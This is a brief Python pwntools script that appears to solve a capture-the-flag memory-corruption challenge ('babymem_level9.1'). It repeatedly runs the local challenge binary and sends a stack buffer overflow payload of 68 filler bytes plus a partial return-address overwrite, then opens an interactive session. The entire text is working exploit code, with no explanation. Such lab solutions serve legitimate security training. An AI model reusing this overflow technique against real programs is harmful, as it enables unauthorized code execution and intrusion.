
import pwn

while True:
	proc = pwn.process("/challenge/babymem_level9.1")
	proc.recvuntil("size:")
	proc.sendline("90")
	#word_local_18 = pwn.p32(0x241e58, endian='little')
	payload = b"a"*68 + b"\x57\x87\x19"
	proc.recvuntil("bytes)!")
	proc.send(payload)
	proc.interactive()
